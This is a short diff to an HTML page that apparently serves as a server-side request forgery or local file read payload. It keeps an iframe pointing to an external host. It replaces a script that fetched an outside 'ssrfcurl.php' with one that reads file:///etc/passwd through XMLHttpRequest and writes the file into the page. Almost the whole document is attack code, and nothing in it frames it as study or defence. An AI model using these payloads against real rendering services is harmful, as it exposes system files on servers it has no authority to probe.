@@ -9,6 +9,12 @@
 <body>
     <iframe src="https://anyquestions69.github.io/script.php" width="400" height="400"></iframe>
        
-
-        <script>fetch('https://anyquestions69.github.io/ssrfcurl.php').then(r=>r.text()).then(s=>alert(s))</script>
+    <script>
+        x=new XMLHttpRequest;
+        x.onload=function(){
+        document.write(this.responseText)
+        };
+        x.open("GET","file:///etc/passwd");
+        x.send();
+        </script>
 </html>
